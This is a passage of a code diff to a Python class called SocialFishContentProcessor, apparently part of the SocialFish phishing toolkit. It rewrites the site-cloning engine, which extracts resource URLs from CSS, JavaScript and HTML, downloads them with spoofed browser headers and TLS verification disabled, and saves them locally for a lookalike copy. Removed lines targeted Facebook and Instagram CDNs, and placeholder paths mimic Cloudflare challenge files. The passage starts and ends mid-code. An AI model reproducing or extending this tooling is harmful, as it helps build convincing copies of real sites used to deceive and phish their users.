+                    urls = re.findall(url_pattern, font_face, re.IGNORECASE)
+                    
+                    for url in urls:
+                        if self._is_valid_resource_url(url, base_url):
+                            resources.append((url, style_tag, 'font-face', 'font'))
+        
+        return resources
+    
+    def _extract_urls_from_css(self, css_content: str, base_url: str) -> List[str]:
+        """Extract all URLs from CSS content"""
         urls = []
         
-        # Comprehensive URL patterns for CSS
+        # CSS URL patterns
         patterns = [
-            r'url\s*\(\s*["\']?([^"\'()]+)["\']?\s*\)',  # Standard url()
-            r'@import\s+["\']([^"\']+)["\']',  # @import statements
-            r'src:\s*url\s*\(\s*["\']?([^"\'()]+)["\']?\s*\)'  # Font src
+            r'url\s*\(\s*["\']?([^"\'()]+)["\']?\s*\)',
+            r'@import\s+["\']([^"\']+)["\']',
+            r'@import\s+url\s*\(\s*["\']?([^"\'()]+)["\']?\s*\)'
         ]
         
         for pattern in patterns:
             matches = re.findall(pattern, css_content, re.IGNORECASE)
             for match in matches:
-                if self._is_valid_url_enhanced(match, base_url):
-                    # Convert relative URLs to absolute
+                if self._is_valid_resource_url(match, base_url):
                     absolute_url = self._resolve_url(match, base_url)
                     if absolute_url:
                         urls.append(absolute_url)
         
         return urls
     
-    def _find_js_embedded_resources(self, soup: BeautifulSoup, base_url: str) -> List[Tuple[str, Any, str, str]]:
-        """Find resources embedded in JavaScript code"""
+    def _extract_resources_from_js(self, js_content: str, base_url: str) -> List[Tuple[str, str]]:
+        """Extract resource URLs from JavaScript content"""
         resources = []
         
-        for script in soup.find_all('script'):
-            if script.string:
-                js_content = script.string
-                urls = self._extract_urls_from_js_universal(js_content, base_url)
-                for url in urls:
-                    resource_type = self._detect_resource_type_universal(url)
-                    resources.append((url, script, 'js-embedded', resource_type))
-        
-        return resources
-    
-    def _extract_urls_from_js_universal(self, js_content: str, base_url: str) -> List[str]:
-        """Extract URLs from JavaScript content - enhanced universal patterns"""
-        import re
-        urls = []
-        
-        # Enhanced JavaScript URL patterns for better coverage
+        # Enhanced JavaScript URL patterns
         patterns = [
-            # Standard extensions
-            r'["\']([^"\']*\.(svg|png|jpg|jpeg|gif|webp|css|js|woff|woff2|ttf|otf|avif|ico))["\']',
+            # Standard file extensions
+            r'["\']([^"\']*\.(png|jpg|jpeg|gif|svg|webp|avif|css|js|woff|woff2|ttf|otf|mp4|mp3|wav|ico))["\']',
             
-            # Dynamic resources (Facebook-style, Instagram-style)
-            r'["\']([^"\']*\/rsrc\.php\/[^"\']*)["\']',
-            r'["\']([^"\']*\/resource\/[^"\']*)["\']',
-            r'["\']([^"\']*static\.cdninstagram\.com[^"\']*)["\']',
-            r'["\']([^"\']*static\.xx\.fbcdn\.net[^"\']*)["\']',
+            # Dynamic resource patterns
+            r'["\']([^"\']*\/[^"\']*\?[^"\']*\.(png|jpg|jpeg|gif|svg|webp|avif|css|js|woff|woff2|ttf|otf))["\']',
             
-            # Generic resource patterns
-            r'["\']([^"\']*\/assets\/[^"\']*\.[a-zA-Z]{2,4})["\']',
-            r'["\']([^"\']*\/static\/[^"\']*\.[a-zA-Z]{2,4})["\']',
-            r'["\']([^"\']*\/dist\/[^"\']*\.[a-zA-Z]{2,4})["\']',
-            r'["\']([^"\']*\/build\/[^"\']*\.[a-zA-Z]{2,4})["\']',
-            
-            # Chunk files (webpack/modern build systems)
-            r'["\']([^"\']*chunk[^"\']*\.[a-zA-Z]{2,4})["\']',
-            r'["\']([^"\']*vendors[^"\']*\.[a-zA-Z]{2,4})["\']',
-            r'["\']([^"\']*runtime[^"\']*\.[a-zA-Z]{2,4})["\']',
-            
-            # JavaScript object properties
-            r'src\s*:\s*["\']([^"\']+\.[a-zA-Z]{2,4})["\']',
-            r'url\s*:\s*["\']([^"\']+\.[a-zA-Z]{2,4})["\']',
-            r'href\s*:\s*["\']([^"\']+\.[a-zA-Z]{2,4})["\']',
+            # Object properties
+            r'(?:src|url|href|image|background|icon)\s*[:=]\s*["\']([^"\']+)["\']',
             
             # Import/require statements
-            r'import\s+[^"\']*["\']([^"\']+\.[a-zA-Z]{2,4})["\']',
-            r'require\s*\(\s*["\']([^"\']+\.[a-zA-Z]{2,4})["\']',
+            r'(?:import|require)\s*\(\s*["\']([^"\']+)["\']',
             
-            # Webpack-style URLs
-            r'__webpack_require__\.[a-zA-Z]+\s*\(\s*["\']([^"\']+)["\']',
+            # Template literals
+            r'`([^`]*\.(png|jpg|jpeg|gif|svg|webp|avif|css|js|woff|woff2|ttf|otf|mp4|mp3|wav))`',
             
-            # Module federation and dynamic imports
-            r'import\s*\(\s*["\']([^"\']+)["\']',
-            r'loadChunk\s*\(\s*["\']([^"\']+)["\']',
+            # Webpack/bundle patterns
+            r'__webpack_public_path__\s*\+\s*["\']([^"\']+)["\']',
+            r'webpackJsonp\([^)]*\)\(\[\],{[^}]*"([^"]*\.(js|css))"',
+            
+            # Modern JS patterns
+            r'new\s+URL\s*\(\s*["\']([^"\']+)["\']',
+            r'fetch\s*\(\s*["\']([^"\']+)["\']'
         ]
         
         for pattern in patterns:
@@ -2263,78 +1332,126 @@ class SocialFishContentProcessor:
                 url = match[0] if isinstance(match, tuple) else match
                 
                 # Skip very short URLs or obvious non-resources
-                if len(url) < 4 or url.startswith(('#', 'data:', 'blob:')):
+                if len(url) < 4 or url.startswith(('#', 'data:', 'blob:', 'javascript:')):
                     continue
                 
-                if self._is_valid_url_enhanced(url, base_url):
+                if self._is_valid_resource_url(url, base_url):
                     absolute_url = self._resolve_url(url, base_url)
                     if absolute_url:
-                        urls.append(absolute_url)
+                        resource_type = self._detect_universal_resource_type(absolute_url)
+                        resources.append((absolute_url, resource_type))
         
+        return resources
+    
+    def _parse_srcset(self, srcset: str) -> List[str]:
+        """Parse srcset attribute to extract URLs"""
+        urls = []
+        # srcset format: "url1 descriptor1, url2 descriptor2, ..."
+        entries = srcset.split(',')
+        for entry in entries:
+            entry = entry.strip()
+            # URL is the first part before any whitespace
+            url = entry.split()[0] if entry.split() else entry
+            if url:
+                urls.append(url)
         return urls
     
-    def _find_svg_resources(self, soup: BeautifulSoup, base_url: str) -> List[Tuple[str, Any, str, str]]:
-        """Find SVG-specific resources"""
-        resources = []
+    def _detect_universal_resource_type(self, url: str) -> str:
+        """Universal resource type detection for any file"""
+        url_lower = url.lower()
         
-        # Process inline SVG elements
-        for svg_elem in soup.find_all('svg'):
-            # Find image references within SVG
-            for image in svg_elem.find_all('image'):
-                href = image.get('href') or image.get('xlink:href')
-                if href and self._is_valid_url_enhanced(href, base_url):
-                    resources.append((href, image, 'href', 'image'))
-            
-            # Find use elements with external references
-            for use in svg_elem.find_all('use'):
-                href = use.get('href') or use.get('xlink:href')
-                if href and href.startswith('http') and self._is_valid_url_enhanced(href, base_url):
-                    resources.append((href, use, 'href', 'svg'))
+        # Image types
+        if any(ext in url_lower for ext in ['.png', '.jpg', '.jpeg', '.gif', '.webp', '.avif', '.bmp', '.ico']):
+            return 'image'
+        elif '.svg' in url_lower:
+            return 'svg'
         
-        return resources
+        # Document types
+        elif any(ext in url_lower for ext in ['.css']):
+            return 'css'
+        elif any(ext in url_lower for ext in ['.js', '.mjs', '.jsx', '.ts', '.tsx']):
+            return 'js'
+        
+        # Font types
+        elif any(ext in url_lower for ext in ['.woff', '.woff2', '.ttf', '.otf', '.eot']):
+            return 'font'
+        
+        # Media types
+        elif any(ext in url_lower for ext in ['.mp4', '.webm', '.avi', '.mov', '.wmv']):
+            return 'video'
+        elif any(ext in url_lower for ext in ['.mp3', '.wav', '.ogg', '.aac', '.flac']):
+            return 'audio'
+        
+        # Document types
+        elif any(ext in url_lower for ext in ['.pdf', '.doc', '.docx', '.txt']):
+            return 'document'
+        elif any(ext in url_lower for ext in ['.json', '.xml', '.manifest']):
+            return 'data'
+        
+        # Default
+        return 'asset'
     
-    def _find_dynamic_resources(self, soup: BeautifulSoup, base_url: str) -> List[Tuple[str, Any, str, str]]:
-        """Find dynamic resource patterns specific to various platforms"""
-        resources = []
-        
-        # Search for any element with URL-like attributes
-        url_attributes = ['src', 'href', 'data-src', 'data-href', 'data-url', 'data-image', 'content']
-        
-        for attr in url_attributes:
-            for element in soup.find_all(attrs={attr: True}):
-                value = element.get(attr)
-                if value and self._looks_like_resource_url(value) and self._is_valid_url_enhanced(value, base_url):
-                    resource_type = self._detect_resource_type_universal(value)
-                    resources.append((value, element, attr, resource_type))
-        
-        return resources
+    def _map_as_to_resource_type(self, as_value: str) -> Optional[str]:
+        """Map preload 'as' attribute to resource type"""
+        mapping = {
+            'style': 'css',
+            'script': 'js',
+            'image': 'image',
+            'font': 'font',
+            'video': 'video',
+            'audio': 'audio',
+            'document': 'document',
+            'fetch': 'data'
+        }
+        return mapping.get(as_value.lower())
     
-    def _looks_like_resource_url(self, url: str) -> bool:
-        """Check if a string looks like a resource URL"""
+    def _is_valid_resource_url(self, url: str, base_url: str) -> bool:
+        """Universal URL validation for any website"""
         if not url or len(url) < 4:
             return False
         
-        # Skip non-URL strings
-        if url.startswith(('javascript:', 'data:', 'blob:', 'mailto:', 'tel:', '#')):
+        # Skip non-resource URLs
+        if url.startswith(('data:', 'blob:', 'javascript:', 'mailto:', 'tel:', '#')):
             return False
         
-        # Look for file extensions or resource patterns
-        resource_indicators = [
-            r'\.(svg|png|jpg|jpeg|gif|webp|css|js|woff|woff2|ttf|otf|avif)',
-            r'/rsrc\.php/',
-            r'/resource/',
-            r'/assets/',
-            r'/static/',
-            r'/images/',
-            r'/css/',
-            r'/js/',
-            r'/fonts/'
+        # Skip URLs that are just fragments or anchors
+        if url.startswith('#') or url == '/':
+            return False
+        
+        # Allow all domains by default (universal approach)
+        # Only skip obvious CDNs that shouldn't be cloned
+        skip_domains = [
+            'fonts.googleapis.com', 
+            'fonts.gstatic.com',
+            'cdnjs.cloudflare.com',
+            'ajax.googleapis.com',
+            'code.jquery.com',
+            'stackpath.bootstrapcdn.com',
+            'maxcdn.bootstrapcdn.com',
+            'unpkg.com',
+            'jsdelivr.net'
         ]
         
-        return any(re.search(pattern, url, re.IGNORECASE) for pattern in resource_indicators)
+        try:
+            if url.startswith('//'):
+                scheme = urllib.parse.urlparse(base_url).scheme
+                url = f"{scheme}:{url}"
+            elif not url.startswith(('http://', 'https://')):
+                return True  # Relative URLs are always valid
+            
+            parsed = urllib.parse.urlparse(url)
+            
+            # Skip known external CDNs only
+            if any(domain in parsed.netloc for domain in skip_domains):
+                return False
+            
+            return True
+            
+        except Exception:
+            return False
     
     def _resolve_url(self, url: str, base_url: str) -> Optional[str]:
-        """Resolve relative URL to absolute URL"""
+        """Universal URL resolution"""
         try:
             if not url or url.startswith(('data:', 'blob:', 'javascript:')):
                 return None
@@ -2349,489 +1466,426 @@ class SocialFishContentProcessor:
         except Exception:
             return None
     
-    def _is_valid_url_enhanced(self, url: str, base_url: str) -> bool:
-        """Enhanced URL validation for universal compatibility"""
-        if not url or url.startswith(('data:', 'blob:', 'javascript:', 'mailto:', 'tel:', '#')):
-            return False
+    def _deduplicate_resources(self, resources: List[Tuple[str, Any, str, str]]) -> List[Tuple[str, Any, str, str]]:
+        """Remove duplicate resources while preserving order"""
+        seen = set()
+        unique = []
         
-        # Allow dynamic resource patterns
-        dynamic_patterns = ['/rsrc.php/', '/resource/', '/assets/', '/static/']
-        if any(pattern in url for pattern in dynamic_patterns):
-            return True
+        for resource in resources:
+            url = resource[0]
+            if url not in seen:
+                seen.add(url)
+                unique.append(resource)
         
-        # Enhanced domain handling
-        allowed_patterns = ['facebook.com', 'fbcdn.net', 'fbsbx.com', 'instagram.com', 'cdninstagram.com', 'twitter.com', 'x.com', 'linkedin.com']
-        skip_domains = ['fonts.googleapis.com', 'cdnjs.cloudflare.com']
-        
-        try:
-            if url.startswith('//'):
-                scheme = urllib.parse.urlparse(base_url).scheme
-                url = f"{scheme}:{url}"
-            elif not url.startswith(('http://', 'https://')):
-                return True  # Relative URL
-            
-            parsed = urllib.parse.urlparse(url)
-            
-            # Skip known external CDNs
-            if any(domain in parsed.netloc for domain in skip_domains):
-                return False
-            
-            # Allow same domain or common platforms
-            base_domain = urllib.parse.urlparse(base_url).netloc
-            if parsed.netloc == base_domain:
-                return True
-            
-            # Allow common social media domains and CDNs
-            return any(pattern in parsed.netloc for pattern in allowed_patterns)
-            
-        except Exception:
-            return False
+        return unique
     
-    def _download_sync_universal_enhanced(self, url, output_dir, resource_type, base_url, referer=None):
-        """ENHANCED: Universal synchronous download - works for any site"""
-        try:
-            import requests
-            
-            # Universal session setup
-            session = requests.Session()
-            session.verify = False
-            session.timeout = 30
-            
-            # Enhanced headers based on URL and resource type
-            headers = self._get_universal_headers(url, resource_type, base_url, referer)
-            
-            # Follow redirects properly
-            response = session.get(url, headers=headers, timeout=30, verify=False, allow_redirects=True)
-            
-            if response.status_code == 200:
-                content = response.content
-                
-                # Enhanced content validation
-                if not self._validate_content(content, resource_type, response.headers):
-                    logger.warning(f"Invalid content type for {resource_type} from {url}")
+    async def _process_universal_resource(self, semaphore: asyncio.Semaphore, resource_url: str, 
+                                        element: Any, attr: str, resource_type: str, 
+                                        base_url: str, output_dir: Path):
+        """Process a single resource universally"""
+        async with semaphore:
+            try:
+                # Resolve URL
+                absolute_url = self._resolve_url(resource_url, base_url)
+                if not absolute_url:
                     return None
                 
-                # Universal decompression
-                content = self._universal_decompress(content, response.headers)
+                # Download resource
+                result = await self.resource_manager.download_resource_universal(
+                    absolute_url, resource_type, base_url
+                )
                 
-                # Update stats
-                self.resource_manager.stats['downloaded'] += 1
-                self.resource_manager.stats['bytes_downloaded'] += len(content)
+                if result:
+                    content, metadata = result
+                    
+                    # Save resource
+                    local_path = await self._save_universal_resource(
+                        content, metadata, resource_type, output_dir
+                    )
+                    
+                    if local_path:
+                        # Store mapping for URL rewriting
+                        self.resource_manager.url_mappings[absolute_url] = local_path
+                        if resource_url != absolute_url:
+                            self.resource_manager.url_mappings[resource_url] = local_path
+                        
+                        # Update element reference if applicable
+                        if element and attr in ['src', 'href'] and hasattr(element, 'attrs'):
+                            element[attr] = local_path
+                        
+                        return local_path
                 
-                # Universal save logic
-                local_path = self._universal_save_enhanced(content, url, output_dir, resource_type, response.headers)
+                return None
                 
-                if local_path:
-                    logger.debug(f"✅ Universal download saved: {local_path} ({len(content)} bytes)")
-                    return local_path
-            
-            return None
-            
-        except Exception as e:
-            logger.error(f"❌ Universal download failed for {url}: {e}")
-            self.resource_manager.stats['failed'] += 1
-            return None
+            except Exception as e:
+                logger.debug(f"Universal resource processing failed for {resource_url}: {e}")
+                return None
     
-    def _get_universal_headers(self, url, resource_type, base_url, referer=None):
-        """Get universal headers that work for any site"""
-        # Detect target domain for customization
-        parsed_base = urllib.parse.urlparse(base_url)
-        target_domain = parsed_base.netloc
-        
-        # Universal base headers
-        headers = {
-            'User-Agent': self._get_universal_user_agent(target_domain),
-            'Accept': self._get_universal_accept_header(resource_type, url),
-            'Accept-Language': 'en-US,en;q=0.9',
-            'Accept-Encoding': 'gzip, deflate, br',
-            'Connection': 'keep-alive',
-            'Referer': referer or base_url,
-            'Cache-Control': 'no-cache',
-            'Pragma': 'no-cache'
-        }
-        
-        # Add security headers for modern sites
-        fetch_site = self._get_fetch_site_universal(url, base_url)
-        headers.update({
-            'Sec-Fetch-Dest': self._get_fetch_dest_universal(resource_type),
-            'Sec-Fetch-Mode': 'no-cors',
-            'Sec-Fetch-Site': fetch_site,
-        })
-        
-        # Platform-specific headers
-        headers.update(self._get_platform_specific_headers(target_domain))
-        
-        return headers
-    
-    def _get_universal_user_agent(self, domain):
-        """Get appropriate user agent for any domain"""
-        # Use modern Chrome user agent for best compatibility
-        return 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36'
-    
-    def _get_universal_accept_header(self, resource_type, url):
-        """Get universal Accept header for any resource type"""
-        # Enhanced accept headers for better compatibility
-        if resource_type == 'svg' or '.svg' in url.lower():
-            return 'image/svg+xml,image/*,*/*;q=0.8'
-        elif resource_type == 'image':
-            return 'image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8'
-        elif resource_type == 'css':
-            return 'text/css,*/*;q=0.1'
-        elif resource_type == 'js':
-            return 'application/javascript,text/javascript,*/*;q=0.01'
-        elif resource_type == 'font':
-            return 'font/woff2,font/woff,font/ttf,*/*;q=0.1'
-        else:
-            return '*/*'
-    
-    def _get_fetch_dest_universal(self, resource_type):
-        """Get universal Sec-Fetch-Dest"""
-        fetch_dest_map = {
-            'image': 'image',
-            'svg': 'image',
-            'css': 'style',
-            'js': 'script',
-            'font': 'font',
-        }
-        return fetch_dest_map.get(resource_type, 'empty')
-    
-    def _get_fetch_site_universal(self, url, base_url):
-        """Universal Sec-Fetch-Site determination"""
+    async def _save_universal_resource(self, content: bytes, metadata: Dict[str, Any], 
+                                     resource_type: str, output_dir: Path) -> Optional[str]:
+        """Universal resource saving with proper handling"""
         try:
-            url_domain = urllib.parse.urlparse(url).netloc
-            base_domain = urllib.parse.urlparse(base_url).netloc
+            url = metadata.get('url', '')
+            content_type = metadata.get('content_type', '')
             
-            if url_domain == base_domain:
-                return 'same-origin'
-            elif url_domain.endswith('.'.join(base_domain.split('.')[-2:])):
-                return 'same-site'
+            # Generate safe filename
+            filename = self._generate_safe_filename(url, content_type, resource_type)
+            subdir = self._get_resource_subdir(resource_type)
+            
+            # Create directory and file path
+            resource_dir = output_dir / subdir
+            resource_dir.mkdir(exist_ok=True)
+            file_path = resource_dir / filename
+            local_path = f"{subdir}/{filename}"
+            
+            # Save content based on type
+            if self._is_text_resource(resource_type, content_type):
+                # Text resources
+                try:
+                    text_content = content.decode('utf-8', errors='ignore')
+                    
+                    # Process CSS imports recursively
+                    if resource_type == 'css':
+                        text_content = await self._process_css_imports_recursive(
+                            text_content, url, output_dir
+                        )
+                    
+                    with open(file_path, 'w', encoding='utf-8') as f:
+                        f.write(text_content)
+                        
+                except Exception as e:
+                    logger.debug(f"Text save failed, trying binary: {e}")
+                    with open(file_path, 'wb') as f:
+                        f.write(content)
             else:
-                return 'cross-site'
-        except:
-            return 'cross-site'
-    
-    def _get_platform_specific_headers(self, domain):
-        """Get platform-specific headers for better compatibility"""
-        headers = {}
-        
-        # Social media platform specific headers
-        social_platforms = ['facebook.com', 'instagram.com', 'cdninstagram.com', 'twitter.com', 'x.com', 'linkedin.com']
-        
-        if any(platform in domain for platform in social_platforms):
-            headers.update({
-                'X-Requested-With': 'XMLHttpRequest',
-                'Sec-Ch-Ua': '"Not A(Brand";v="99", "Google Chrome";v="121", "Chromium";v="121"',
-                'Sec-Ch-Ua-Mobile': '?0',
-                'Sec-Ch-Ua-Platform': '"Windows"'
-            })
-        
-        return headers
-    
-    def _validate_content(self, content, resource_type, headers):
-        """Validate that downloaded content matches expected type"""
-        if not content:
-            return False
-        
-        content_type = headers.get('content-type', '').lower()
-        
-        # Check for HTML returned instead of expected content
-        if resource_type in ['image', 'svg', 'font'] and ('html' in content_type or content.startswith(b'<!DOCTYPE') or content.startswith(b'<html')):
-            return False
-        
-        # Additional validation for specific types
-        if resource_type == 'svg':
-            # SVG should start with SVG tag or be valid XML
-            if not (content.startswith(b'<svg') or content.startswith(b'<?xml')):
-                return False
-        
-        return True
-    
-    def _universal_decompress(self, content, headers):
-        """Universal decompression that works for any site"""
-        if not content:
-            return content
+                # Binary resources
+                with open(file_path, 'wb') as f:
+                    f.write(content)
             
-        encoding = headers.get('content-encoding', '').lower()
-        
-        try:
-            if 'br' in encoding:
-                return brotli.decompress(content)
-            elif 'gzip' in encoding:
-                return gzip.decompress(content)
-            elif 'deflate' in encoding:
-                return zlib.decompress(content)
+            # Verify save
+            if file_path.exists() and file_path.stat().st_size > 0:
+                logger.debug(f"Saved universal resource: {local_path}")
+                return local_path
+            
+            return None
+            
         except Exception as e:
-            logger.debug(f"Decompression failed, using raw content: {e}")
-            # Magic byte detection fallback
-            if content[:2] == b'\x1f\x8b':
-                try:
-                    return gzip.decompress(content)
-                except:
-                    pass
-            elif content[0:1] == b'\x78':
-                try:
-                    return zlib.decompress(content)
-                except:
-                    pass
-        
-        return content
+            logger.debug(f"Universal resource save failed: {e}")
+            return None
     
-    def _universal_save_enhanced(self, content, url, output_dir, resource_type, headers):
-        """Enhanced universal save logic with filename length protection"""
-        parsed_url = urllib.parse.urlparse(url)
+    async def _process_css_imports_recursive(self, css_content: str, css_url: str, 
+                                           output_dir: Path) -> str:
+        """Process CSS @import statements recursively"""
         
-        # Handle dynamic resource URLs (like Facebook's rsrc.php)
-        if any(pattern in url for pattern in ['/rsrc.php/', '/resource/', '/assets/', '/static/']):
-            return self._save_dynamic_resource_safe(content, url, output_dir, resource_type, headers)
+        # Avoid infinite recursion
+        if css_url in self.resource_manager.processed_css_imports:
+            return css_content
         
-        # Check filename length for original path preservation
-        if resource_type in ['image', 'svg'] and parsed_url.path and parsed_url.path != '/':
-            original_path = parsed_url.path.lstrip('/')
+        self.resource_manager.processed_css_imports.add(css_url)
+        
+        # Find @import statements
+        import_pattern = r'@import\s+(?:url\s*\(\s*)?["\']?([^"\'();\s]+)["\']?\s*\)?[^;]*;'
+        
+        def process_import(match):
+            import_url = match.group(1)
             
-            # CRITICAL FIX: Check total path length to prevent filesystem errors
-            full_path = output_dir / original_path
-            if len(str(full_path)) > 250:  # Safe limit for most filesystems
-                logger.warning(f"Path too long, using hash-based naming: {len(str(full_path))} chars")
-                return self._save_with_hash_name(content, url, output_dir, resource_type, headers)
+            if self._is_valid_resource_url(import_url, css_url):
+                absolute_import_url = self._resolve_url(import_url, css_url)
+                
+                if absolute_import_url and absolute_import_url not in self.resource_manager.processed_css_imports:
+                    # Download imported CSS
+                    try:
+                        result = self.resource_manager.download_resource_universal(
+                            absolute_import_url, 'css', css_url
+                        )
+                        
+                        # This would need to be handled differently in real async context
+                        # For now, return the modified import statement
+                        local_path = f"css/imported_{hashlib.md5(absolute_import_url.encode()).hexdigest()[:8]}.css"
+                        return f'@import url("{local_path}");'
+                        
+                    except Exception:
+                        pass
             
-            try:
-                file_path = output_dir / original_path
-                file_path.parent.mkdir(parents=True, exist_ok=True)
-                local_path = original_path
-            except OSError as e:
-                logger.warning(f"Path creation failed: {e}, using hash-based naming")
-                return self._save_with_hash_name(content, url, output_dir, resource_type, headers)
-        else:
-            return self._save_with_hash_name(content, url, output_dir, resource_type, headers)
+            return match.group(0)
         
-        # Universal binary save (works for all sites)
+        return re.sub(import_pattern, process_import, css_content, flags=re.IGNORECASE)
+    
+    def _generate_safe_filename(self, url: str, content_type: str, resource_type: str) -> str:
+        """Generate a safe filename for any resource"""
         try:
-            with open(file_path, 'wb') as f:
-                f.write(content)
-            return local_path
-        except OSError as e:
-            logger.error(f"File save failed: {e}, trying hash-based naming")
-            return self._save_with_hash_name(content, url, output_dir, resource_type, headers)
-    
-    def _save_dynamic_resource_safe(self, content, url, output_dir, resource_type, headers):
-        """Save dynamic resources with safe filename handling"""
-        parsed_url = urllib.parse.urlparse(url)
-        
-        # Extract filename from dynamic URL
-        path_parts = parsed_url.path.split('/')
-        original_filename = path_parts[-1] if path_parts else 'resource'
-        
-        # SAFE FILENAME: Limit length and sanitize
-        if len(original_filename) > 100:  # Too long, use hash
+            parsed = urllib.parse.urlparse(url)
+            
+            # Try to use original filename if reasonable
+            if parsed.path and len(parsed.path) > 1:
+                original_name = os.path.basename(parsed.path)
+                if original_name and len(original_name) < 100 and not original_name.startswith('.'):
+                    # Clean the filename
+                    safe_name = re.sub(r'[^\w\-._]', '_', original_name)
+                    if safe_name and not safe_name.startswith('_'):
+                        return safe_name
+            
+            # Generate filename from URL hash
             url_hash = hashlib.sha256(url.encode()).hexdigest()[:16]
-            extension = self._get_extension_enhanced(url, headers.get('content-type', ''), resource_type)
-            filename = f"dyn_{url_hash}{extension}"
-        else:
-            # Use original but ensure proper extension
-            if '.' not in original_filename:
-                extension = self._get_extension_enhanced(url, headers.get('content-type', ''), resource_type)
-                filename = f"{original_filename}{extension}"
-            else:
-                filename = original_filename
-        
-        # Sanitize filename for filesystem safety
-        filename = re.sub(r'[<>:"/\\|?*]', '_', filename)
-        
-        # Save in appropriate subdirectory
-        subdir = self._get_subdir_enhanced(resource_type)
-        resource_dir = output_dir / subdir
-        resource_dir.mkdir(exist_ok=True)
-        file_path = resource_dir / filename
-        local_path = f"{subdir}/{filename}"
-        
-        # Ensure path isn't too long
-        if len(str(file_path)) > 250:
-            return self._save_with_hash_name(content, url, output_dir, resource_type, headers)
-        
-        # Save file
-        try:
-            with open(file_path, 'wb') as f:
-                f.write(content)
-            return local_path
-        except OSError as e:
-            logger.warning(f"Dynamic resource save failed: {e}, using hash fallback")
-            return self._save_with_hash_name(content, url, output_dir, resource_type, headers)
+            extension = self._get_file_extension(url, content_type, resource_type)
+            
+            return f"resource_{url_hash}{extension}"
+            
+        except Exception:
+            # Fallback to simple hash
+            url_hash = hashlib.md5(url.encode()).hexdigest()[:12]
+            extension = self._get_file_extension(url, content_type, resource_type)
+            return f"res_{url_hash}{extension}"
     
-    def _save_with_hash_name(self, content, url, output_dir, resource_type, headers):
-        """Fallback save method using hash-based naming (always works)"""
-        url_hash = hashlib.sha256(url.encode()).hexdigest()[:16]
-        extension = self._get_extension_enhanced(url, headers.get('content-type', ''), resource_type)
-        filename = f"res_{url_hash}{extension}"
-        subdir = self._get_subdir_enhanced(resource_type)
-        resource_dir = output_dir / subdir
-        resource_dir.mkdir(exist_ok=True)
-        file_path = resource_dir / filename
-        local_path = f"{subdir}/{filename}"
+    def _get_file_extension(self, url: str, content_type: str, resource_type: str) -> str:
+        """Get appropriate file extension"""
         
-        # This should always work as it's a short, safe filename
-        with open(file_path, 'wb') as f:
-            f.write(content)
-        
-        return local_path
-    
-    def _get_extension_enhanced(self, url: str, content_type: str, resource_type: str) -> str:
-        """Enhanced extension detection"""
         # Try URL extension first
         try:
             parsed = urllib.parse.urlparse(url)
             if parsed.path:
                 _, ext = os.path.splitext(parsed.path)
-                if ext and len(ext) <= 5:
+                if ext and len(ext) <= 6 and ext.startswith('.'):
                     return ext
         except Exception:
             pass
         
-        # Enhanced content type mapping
-        extensions = {
+        # Content type mapping
+        type_extensions = {
             'text/css': '.css',
-            'application/javascript': '.js',
             'text/javascript': '.js',
+            'application/javascript': '.js',
+            'application/x-javascript': '.js',
             'image/jpeg': '.jpg',
+            'image/jpg': '.jpg',
             'image/png': '.png',
             'image/gif': '.gif',
             'image/svg+xml': '.svg',
             'image/webp': '.webp',
             'image/avif': '.avif',
-            'font/woff2': '.woff2',
             'font/woff': '.woff',
+            'font/woff2': '.woff2',
             'application/font-woff': '.woff',
             'application/font-woff2': '.woff2',
             'font/ttf': '.ttf',
-            'font/otf': '.otf'
+            'font/otf': '.otf',
+            'video/mp4': '.mp4',
+            'video/webm': '.webm',
+            'audio/mp3': '.mp3',
+            'audio/wav': '.wav',
+            'application/json': '.json',
+            'application/xml': '.xml'
         }
         
-        # Special handling for resource types
-        if resource_type == 'svg':
-            return '.svg'
-        elif resource_type == 'image' and not content_type:
-            return '.jpg'  # Default for images
+        if content_type:
+            base_type = content_type.split(';')[0].strip().lower()
+            if base_type in type_extensions:
+                return type_extensions[base_type]
         
-        return extensions.get(content_type.split(';')[0] if content_type else '', '.bin')
+        # Resource type fallbacks
+        type_fallbacks = {
+            'css': '.css',
+            'js': '.js',
+            'image': '.jpg',
+            'svg': '.svg',
+            'font': '.woff',
+            'video': '.mp4',
+            'audio': '.mp3',
+            'json': '.json'
+        }
+        
+        return type_fallbacks.get(resource_type, '.bin')
     
-    def _get_subdir_enhanced(self, resource_type: str) -> str:
-        """Enhanced subdirectory mapping"""
+    def _get_resource_subdir(self, resource_type: str) -> str:
+        """Get subdirectory for resource type"""
         subdirs = {
             'css': 'css',
-            'js': 'js', 
+            'js': 'js',
             'image': 'images',
-            'svg': 'images',  # SVGs go in images folder
+            'svg': 'images',
             'font': 'fonts',
-            'asset': 'assets'
+            'video': 'videos',
+            'audio': 'audio',
+            'document': 'documents',
+            'data': 'data'
         }
         return subdirs.get(resource_type, 'assets')
     
-    def _create_placeholder_resources(self, output_dir: Path):
-        """Create placeholder files for common missing resources to prevent 404s"""
-        try:
-            # Common missing files that cause 404s
-            placeholder_files = [
-                ('favicon.ico', 'assets', b''),  # Empty favicon
-                ('fluidicon.png', 'images', b'\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x00\x01\x00\x00\x00\x01\x08\x06\x00\x00\x00\x1f\x15\xc4\x89\x00\x00\x00\nIDATx\xda\x63\x00\x01\x00\x00\x05\x00\x01\r\n-\xdb\x00\x00\x00\x00IEND\xaeB`\x82'),  # 1x1 PNG
-                ('hsts-pixel.gif', 'images', b'GIF89a\x01\x00\x01\x00\x80\x00\x00\x00\x00\x00\xff\xff\xff!\xf9\x04\x01\x00\x00\x00\x00,\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02\x04\x01\x00;'),  # 1x1 GIF
-                ('chunk-vendors.js', 'js', b'// Placeholder chunk file\nconsole.log("Chunk loaded");'),
-                ('runtime.js', 'js', b'// Placeholder runtime\nwindow.__webpack_require__ = function(){};'),
-                ('polyfill.js', 'js', b'// Placeholder polyfill\n'),
-                ('main.js', 'js', b'// Placeholder main script\n'),
-            ]
-            
-            for filename, subdir, content in placeholder_files:
-                file_dir = output_dir / subdir
-                file_dir.mkdir(exist_ok=True)
-                file_path = file_dir / filename
-                
-                # Only create if doesn't exist
-                if not file_path.exists():
-                    with open(file_path, 'wb') as f:
-                        f.write(content)
-                    logger.debug(f"Created placeholder: {file_path}")
-            
-            # Create common subdirectories if they don't exist
-            for subdir in ['security', 'cdn-cgi/challenge-platform/scripts/jsd', 'token']:
